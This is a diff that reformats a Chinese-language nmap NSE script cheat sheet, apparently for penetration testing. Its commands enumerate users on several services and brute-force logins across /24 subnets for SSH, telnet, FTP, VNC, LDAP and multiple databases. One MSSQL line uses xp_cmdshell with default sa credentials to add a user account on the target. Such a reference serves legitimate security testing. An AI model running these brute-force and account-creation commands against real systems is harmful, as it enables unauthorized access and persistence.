@@ -143,132 +143,71 @@ nmap 默认发送一个 ARP 的 PING 数据包,来探测目标主机 1-10000 范
 ## 脚本
 ### 常见
 
-- **[smb-enum-users](https://nmap.org/nsedoc/scripts/smb-enum-users.html)** - 用于枚举SMB用户
-    ```bash
-    nmap --script smb-enum-users.nse -p 445 <target ip>
-    sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <target ip>
-    ```
+- smb
+    - 枚举 SMB 用户 : `nmap --script smb-enum-users.nse -p 445 <target ip>`
+    - 枚举 SMB 用户 : `nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <target ip>`
 
-- 用于知道自己网站使用了哪些 http 方法
-
-    `nmap -p 80 --script http-methods <www.xxx.com>`
-
-- 寻找登录授权页面
-
-    `nmap -p 80 --script http-auth-finder <www.xxx.com>`
-
-- 启用所有和授权有关的脚本对目标主机进行探测
-
-    `nmap -p-80 --script=auth <www.xxx.com>`
+- http
+    - 用于知道自己网站使用了哪些 http 方法 : `nmap -p 80 --script http-methods <www.xxx.com>`
+    - 寻找登录授权页面 : `nmap -p 80 --script http-auth-finder <www.xxx.com>`
+    - 启用所有和授权有关的脚本对目标主机进行探测 : `nmap -p-80 --script=auth <www.xxx.com>`
 
 - rsync
-
-    爆破
-
-    `nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' <target ip>/24`
+    - 爆破 : `nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' <target ip>/24`
 
 - vnc
-
-    爆破
-
-    `nmap --script vnc-brute -p 5900 <target ip>/24`
+    - 信息探测 : `nmap -p 5901 -script vnc-info <target ip>`
+    - 爆破 : `nmap --script vnc-brute -p 5900 <target ip>/24`
 
 - SSH
-
-    爆破
-
-    `nmap -p22 --script ssh-brute <target ip>`
+    - 爆破 : `nmap -p22 --script ssh-brute <target ip>`
 
 - telnet
-
-    爆破
-
-    `nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v <target ip>/24`
+    - 爆破 : `nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v <target ip>/24`
 
 - ldap
-
-    爆破
-
-    `nmap -p 389 --script ldap-brute --script-args ldap.base='cn=users,dc=cqure,dc=net' <target ip>/24`
+    - 爆破 : `nmap -p 389 --script ldap-brute --script-args ldap.base='cn=users,dc=cqure,dc=net' <target ip>/24`
 
 - FTP
-
-    `nmap -p21 --script ftp-syst <target ip>`
-
-    爆破
-
-    `nmap -p21 <target ip> --script ftp-brute --script-args userdb=/root/user.txt,passdb=/root/pass.txt`
+    - 信息探测 : `nmap -p21 --script ftp-syst <target ip>`
+    - 爆破 : `nmap -p21 <target ip> --script ftp-brute --script-args userdb=/root/user.txt,passdb=/root/pass.txt`
 
 - SNMP
+    - 查找 snmp 弱口令 : `nmap –sU –p161 –script=snmp-brute <target ip>`
+    - 获取网络端口状态 : `nmap -sU -p161 --script=snmp-netstat <target ip>`
+    - 获取系统信息 : `nmap –sU –p161 –script=snmp-sysdescr <target ip>`
+    - 获取用户信息 : `nmap -sU -p161 --script=snmp-win32-user <target ip>`
 
-    ```bash
-    nmap –sU –p161 –script=snmp-brute <target ip>   # 查找 snmp 弱口令
-    nmap -sU -p161 --script=snmp-netstat <target ip>    # 获取网络端口状态
-    nmap –sU –p161 –script=snmp-sysdescr <target ip>    # 获取系统信息
-    nmap -sU -p161 --script=snmp-win32-user <target ip> # 获取用户信息
-    ```
-
-- SMTP 枚举用户名
-
-    `nmap -p 25 --script smtp-enum-users.nse <target ip>`
+- SMTP
+    - 枚举用户名 : `nmap -p 25 --script smtp-enum-users.nse <target ip>`
 
 - 截图
     - [Nmap-Tools/NSE/http-screenshot.nse](https://github.com/SpiderLabs/Nmap-Tools/blob/master/NSE/http-screenshot.nse)
 
-- dns 域传送
-
-    `nmap -p 53 --script dns-zone-transfer.nse -v <target ip>`
+- dns
+    - 域传送 : `nmap -p 53 --script dns-zone-transfer.nse -v <target ip>`
 
 ### 数据库
 
 - MySQL
-
-    `nmap -p3306 --script mysql-enum <target ip>`
-
-    mysql 扫描 root 空密码
-
-    `nmap -p 3306 --script mysql-empty-password.nse -v <target ip>`
-
-    mysql root 弱口令简单爆破
-
-    `nmap -p 3306 --script mysql-brute.nse -v <target ip>`
+    - 信息收集 : `nmap -p3306 --script mysql-enum <target ip>`
+    - mysql 扫描 root 空密码 : `nmap -p 3306 --script mysql-empty-password.nse -v <target ip>`
+    - mysql root 弱口令简单爆破 : `nmap -p 3306 --script mysql-brute.nse -v <target ip>`
 
 - mssql
-
-    扫描 sa 空密码
-
-    `nmap -p 1433 --script ms-sql-empty-password.nse -v <target ip>/24`
-
-    sa 弱口令爆破
-
-    `nmap -p 1433 --script ms-sql-brute.nse -v <target ip>/24`
-
-    利用 xp_cmdshell,远程执行系统命令
-
-    `nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add <target ip>/24`
+    - 扫描 sa 空密码 : `nmap -p 1433 --script ms-sql-empty-password.nse -v <target ip>/24`
+    - sa 弱口令爆破 : `nmap -p 1433 --script ms-sql-brute.nse -v <target ip>/24`
+    - 利用 xp_cmdshell,远程执行系统命令 : `nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add <target ip>/24`
 
 - postgresql
-
-    爆破
-
-    `nmap -p 5432 --script pgsql-brute -v <target ip>/24`
+    - 爆破 : `nmap -p 5432 --script pgsql-brute -v <target ip>/24`
 
 - oracle
-
-    爆破
-
-    `nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v <target ip>/24`
-
-    `nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v <target ip>/24`
+    - 爆破 : `nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v <target ip>/24`
+    - 爆破 : `nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v <target ip>/24`
 
 - mongdb
-
-    爆破
-
-    `nmap -p 27017  --script mongodb-brute <target ip>/24`
+    - 爆破 : `nmap -p 27017  --script mongodb-brute <target ip>/24`
 
 - redis
-
-    爆破
-
-    `nmap -p 6379 --script redis-brute.nse <target ip>/24`
+    - 爆破 : `nmap -p 6379 --script redis-brute.nse <target ip>/24`
